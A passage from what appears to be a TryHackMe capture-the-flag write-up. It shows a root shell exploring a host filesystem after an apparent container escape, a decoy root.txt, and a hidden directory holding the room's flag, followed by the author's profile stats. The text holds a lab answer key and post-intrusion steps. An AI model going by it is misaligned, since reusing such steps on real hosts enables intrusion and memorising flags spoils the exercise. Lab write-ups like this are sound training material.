lrwxrwxrwx    1 root     root          34 Dec  8  2021 initrd.img.old -> boot/initrd.img-4.15.0-163-generic
drwxr-xr-x   25 root     root        4.0K Apr 26 23:26 lib
drwxr-xr-x    2 root     root        4.0K Jun  5 18:06 lib64
drwx------    2 root     root       16.0K Dec  8  2021 lost+found
drwxr-xr-x    2 root     root        4.0K Dec  8  2021 media
drwxr-xr-x    2 root     root        4.0K Dec  8  2021 mnt
drwxr-xr-x    3 root     root        4.0K Dec 13  2021 opt
drwxr-xr-x    2 root     root        4.0K Apr 24  2018 proc
drwx------    5 root     root        4.0K Jun  5 18:16 root
drwxr-xr-x    3 root     root        4.0K Dec  8  2021 run
drwxr-xr-x    2 root     root       12.0K Jun  5 18:07 sbin
drwxr-xr-x    2 root     root        4.0K Dec  8  2021 srv
drwxr-xr-x    2 root     root        4.0K Apr 24  2018 sys
drwxrwxrwt   11 root     root        4.0K Jul  4 00:03 tmp
drwxr-xr-x   11 root     root        4.0K Apr 26 23:15 usr
drwxr-xr-x   12 root     root        4.0K Dec 13  2021 var
lrwxrwxrwx    1 root     root          31 Apr 26 23:15 vmlinuz -> boot/vmlinuz-4.15.0-213-generic
lrwxrwxrwx    1 root     root          31 Dec  8  2021 vmlinuz.old -> boot/vmlinuz-4.15.0-163-generic
```


```bash
bash-4.4# ls -lah
ls -lah
total 36
drwx------    5 root     root        4.0K Jun  5 18:16 .
drwxr-xr-x   22 root     root        4.0K Jul  3 21:39 ..
drwxr-xr-x    2 root     root        4.0K Dec 13  2021 ...
-rw-r--r--    1 root     root        3.0K Apr  9  2018 .bashrc
drwx------    2 root     root        4.0K May 24 14:35 .cache
-rw-r--r--    1 root     root         161 Jan  2  2024 .profile
drwx------    2 root     root        4.0K Dec 13  2021 .ssh
-rw-------    1 root     root         966 Jun  5 18:16 .viminfo
-r--------    1 root     root          29 Dec 13  2021 root.txt
bash-4.4# cat root.txt
cat root.txt
Pffft. Come on. Look harder.
```



```bash
bash-4.4# pwd
pwd
/tmp/root_/root/...
bash-4.4# ls -lah
ls -lah
total 12
drwxr-xr-x    2 root     root        4.0K Dec 13  2021 .
drwx------    5 root     root        4.0K Jun  5 18:16 ..
-r--------    1 root     root          26 Dec 13  2021 ._fLaG2
bash-4.4# cat ._flaG2
cat ._flaG2
cat: can't open '._flaG2': No such file or directory
bash-4.4# cat .fLaG2
cat .fLaG2
cat: can't open '.fLaG2': No such file or directory
bash-4.4# cat ._fLaG2
cat ._fLaG2
THM{C0NT41N3R_3SC4P3_FTW}
```

<br>

<h2>Task 3 . Credits & Reference</h2>

<br>
<br>

![image](https://github.com/user-attachments/assets/3f4ce941-a6a6-4397-b573-89770cb58d01)

![image](https://github.com/user-attachments/assets/7f7d3bd8-1b0e-409d-89ad-932fba2169fe)

<br>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| July 3, 2025      | 423      |     163rd    |      5ᵗʰ     |    3,878ᵗʰ  |     68ᵗʰ   |  112,664 |    822    |     63    |

</div>

![image](https://github.com/user-attachments/assets/5d3f34e8-25bf-4f9d-8e51-457160a78e10)

![image](https://github.com/user-attachments/assets/a21e6364-6249-4a20-af34-f858f3f00879

![image](https://github.com/user-attachments/assets/fbf2a399-067b-44fa-83c7-6c946be3aae9)

![image](https://github.com/user-attachments/assets/d2331eca-6058-441e-9794-63126d384f28)

![image](https://github.com/user-attachments/assets/637e52a7-6dad-4415-97a7-478f7c687429)
